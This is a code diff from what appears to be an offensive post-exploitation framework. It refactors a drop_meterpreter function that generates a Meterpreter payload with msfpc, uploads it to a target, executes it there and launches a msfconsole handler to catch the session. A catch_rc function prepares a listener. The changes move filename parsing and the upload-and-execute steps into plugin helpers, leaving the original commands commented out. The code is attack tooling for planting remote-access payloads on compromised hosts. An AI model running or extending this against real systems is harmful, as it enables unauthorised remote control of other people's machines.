@@ -99,16 +99,7 @@ def drop_meterpreter(cmd_str, arg_str=""):
     if not target:
         print("Set target first!")
         return
-    outname = None
-    outarg = "-o"
-    if outarg in arg_str:
-        arr = shlex.split(arg_str)
-        i = arr.index(outarg)
-        if len(arr) > i + 1:
-            outname = arr[i+1]
-            arr.remove(outname)
-        arr.remove(outarg)
-        arg_str = " ".join([shlex.quote(a) for a in arr])
+    arg_str, outname = plugin.get_filename(arg_str)
         
     payload, handler = _msfpc(cmd_str, arg_str)
     if outname:
@@ -116,15 +107,16 @@ def drop_meterpreter(cmd_str, arg_str=""):
        handler = _rename(handler, "{}.rc".format(outname.rsplit(".", 1)[0]) )
     #handler_cmd = "msfconsole -qr {};".format(handler)
     handler_cmd = _patch_handler(handler)
-    cmds = []
-    cmds.append("upload {}".format(payload))
-    cmds.append(
-      "_shell {} {}".format(
-        shlex.quote("execute_file {}".format(os.path.basename(payload)) )
-        , shlex.quote(handler_cmd) )
-    )
-    print(cmds)
-    return cmds
+    #cmds = []
+    #cmds.append("upload {}".format(payload))
+    #cmds.append(
+    #  "_shell {} {}".format(
+    #    shlex.quote("execute_file {}".format(os.path.basename(payload)) )
+    #    , shlex.quote(handler_cmd) )
+    #)
+    #print(cmds)
+    #return cmds
+    return plugin._drop_tool(payload, handler_cmd)
 
 def catch_rc(filename):
     return plugin.prepare_listener("msfconsole -qr {}".format(filename))
